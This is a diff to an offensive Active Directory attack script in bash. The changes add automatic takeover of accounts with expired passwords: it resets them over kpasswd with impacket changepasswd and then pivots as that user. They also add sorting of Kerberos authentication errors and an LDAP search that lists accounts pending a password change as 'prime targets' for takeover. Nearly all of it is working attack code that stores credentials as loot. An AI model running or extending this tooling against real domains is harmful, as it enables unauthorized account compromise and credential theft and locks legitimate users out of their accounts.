@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.2.0"
+readonly VERSION="1.3.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -595,6 +595,49 @@ phase_asreproast() {
     fi
 }
 
+# Expired / must-change password: with the known (old) plaintext we can set a
+# new one over kpasswd and use the account immediately — a real path, not a dead end.
+_change_expired_password() {
+    [[ -z "$PASS" ]] && return 1            # need current plaintext to change it
+    local tool; tool=$(command -v changepasswd.py || command -v impacket-changepasswd) || return 1
+    local newpw="$PIVOT_PW" host="${DC_FQDN:-$DC_IP}"
+    warn "Password for '${USER}' is EXPIRED / must change — resetting via kpasswd to regain access"
+    confirm "  Set a new password for '${USER}' (expired anyway) and continue as them?" || return 1
+    run "$tool $DOMAIN/$USER:***@$host -newpass *** -p kpasswd -dc-ip $DC_IP"
+    if "$tool" "$DOMAIN/$USER:$PASS@$host" -newpass "$newpw" -p kpasswd -dc-ip "$DC_IP" 2>&1 \
+         | tee -a "$LOGFILE" | grep -qiE 'changed successfully|password was changed|success'; then
+        loot "★ Changed expired password for '${USER}' → pivoting as that user"
+        rb_record "Changed expired password for $USER (was expired; original unknown)" \
+                  "echo 'Manual: coordinate password restore for $USER with the client'"
+        add_secret "$newpw" "expired-password reset for $USER"
+        note_cred_source "$USER" "expired-password reset via kpasswd"
+        unset 'SEEN_CREDS[${USER,,}]'
+        queue_cred "$USER" "$newpw" ""
+        return 0
+    fi
+    warn "Could not change the expired password for '${USER}'"; return 1
+}
+
+# Read the WHY behind a failed Kerberos auth and act on it. Returns 0 when the
+# failure is explained (so we stop second-guessing it as a generic bad cred).
+_classify_auth_error() {
+    local out="$1"
+    if echo "$out" | grep -qiE 'KEY_EXPIRED|PWD_EXPIRED|password.*expired|must.*change.*password'; then
+        _change_expired_password; return 0
+    elif echo "$out" | grep -qiE 'CLIENT_REVOKED|ACCOUNT.?DISABLED|account is disabled|revoked|LOCKED|account.*lock'; then
+        warn "Account '${USER}' is DISABLED / LOCKED / REVOKED — creds may be valid once re-enabled/unlocked"
+        note_cred_source "$USER" "valid-but-disabled/locked (enable to use)"
+        echo "$USER" >>"$OUTDIR/disabled_or_locked.txt"; return 0
+    elif echo "$out" | grep -qiE 'C_PRINCIPAL_UNKNOWN|PRINCIPAL_UNKNOWN|client not found|CLIENT_NOT_FOUND'; then
+        warn "Account '${USER}' does NOT exist — it may be DELETED (check AD Recycle Bin / restore it)"; return 0
+    elif echo "$out" | grep -qiE 'PREAUTH_FAILED|wrong password|LOGON_FAILURE|preauthentication'; then
+        err "Wrong password for '${USER}'"; return 0
+    elif echo "$out" | grep -qiE 'SKEW|clock'; then
+        warn "Clock skew vs DC — sync time (sudo ntpdate $DC_IP) and retry '${USER}'"; return 0
+    fi
+    return 1
+}
+
 # ===========================================================================
 #  PHASE 4 — CREDENTIAL VALIDATION + KERBEROS TGT
 # ===========================================================================
@@ -607,15 +650,16 @@ phase_validate_creds() {
     # proof the credentials are valid. ---
     if [[ "$KERBEROS" == "1" ]] && have impacket-getTGT && [[ -n "$DOMAIN" ]]; then
         subsection "Requesting Kerberos TGT first (-dc-ip, DNS-independent)"
-        local tgt="$OUTDIR/$(_safe_name "$USER").ccache"
+        local tgt="$OUTDIR/$(_safe_name "$USER").ccache" tgtout=""
         rm -f "${USER}.ccache"
         if [[ -n "$HASH" ]]; then
             run "impacket-getTGT $(imp_principal) -hashes :$HASH -dc-ip $DC_IP"
-            impacket-getTGT "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" 2>&1 | tee -a "$LOGFILE"
+            tgtout=$(impacket-getTGT "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" 2>&1)
         else
             run "impacket-getTGT $(imp_principal):*** -dc-ip $DC_IP"
-            impacket-getTGT "$(imp_principal):${PASS}" -dc-ip "$DC_IP" 2>&1 | tee -a "$LOGFILE"
+            tgtout=$(impacket-getTGT "$(imp_principal):${PASS}" -dc-ip "$DC_IP" 2>&1)
         fi
+        echo "$tgtout" | tee -a "$LOGFILE"
         if [[ -f "${USER}.ccache" ]]; then
             mv -f "${USER}.ccache" "$tgt" 2>/dev/null
             export KRB5CCNAME="$tgt"; KERB_TICKET="$tgt"; HAVE_AUTH=1
@@ -623,6 +667,9 @@ phase_validate_creds() {
             loot "Reusable Kerberos ticket → KRB5CCNAME=$tgt"
             note_cred_source "$USER" "authenticated (TGT obtained)"
         else
+            # Classify WHY: expired password (recoverable!), disabled/locked,
+            # nonexistent (deleted?), clock skew, or simply wrong password.
+            _classify_auth_error "$tgtout" && return
             warn "Could not obtain TGT (bad creds, clock skew, or wrong domain)"
         fi
     fi
@@ -1345,7 +1392,7 @@ _abuse_adcs() {
 phase_recycle_disabled() {
     [[ "$HAVE_AUTH" != "1" || "$CAP_LDAP" != "1" ]] && return
     have bloodyAD || return
-    section "DELETED & DISABLED ACCOUNTS"
+    section "ACCOUNT LIFECYCLE · DISABLED · DELETED · PASSWORD-RESET"
     local ba; mapfile -t ba < <(bloody_args)
     local changed=0
 
@@ -1371,6 +1418,22 @@ phase_recycle_disabled() {
         fi
     else
         info "No disabled user accounts found"
+    fi
+
+    subsection "Accounts that must change password at next logon (pwdLastSet=0)"
+    # An admin set a temporary password and the user never logged in. If we hold
+    # ForceChangePassword over them (see ACL phase) or know that temp password,
+    # it's an easy takeover. Surface them as priority targets.
+    local mustchg
+    mustchg=$(bloodyAD "${ba[@]}" get search \
+            --filter '(&(objectCategory=person)(objectClass=user)(pwdLastSet=0)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
+            --attr sAMAccountName 2>/dev/null | grep -oiP 'sAMAccountName:\s*\K\S+' | grep -viE '^(krbtgt|guest)$')
+    if [[ -n "$mustchg" ]]; then
+        echo "$mustchg" | while read -r u; do echo -e "      ${C_MAGENTA}· $u (password reset pending — temp password set)${C_RESET}"; done
+        echo "$mustchg" >"$OUTDIR/must_change_password.txt"
+        loot "Accounts pending password change — prime targets for ForceChangePassword / temp-password reuse"
+    else
+        info "No accounts pending a password change"
     fi
 
     subsection "Deleted objects (AD Recycle Bin)"
@@ -2581,7 +2644,7 @@ finalize_loot() {
 
     _mv_loot secrets laps.txt gmsa.txt gpp.txt dpapi.txt winrm_users.txt share_secrets.txt \
         coerce.txt relay_ldap.txt trusts.txt certipy_find.txt disabled_accounts.txt \
-        deleted_objects.txt
+        deleted_objects.txt disabled_or_locked.txt must_change_password.txt
 
     local f
     for f in "$OUTDIR"/acl_writable_*.txt;          do [[ -e "$f" ]] && mv -f "$f" "$OUTDIR/secrets/" 2>/dev/null; done
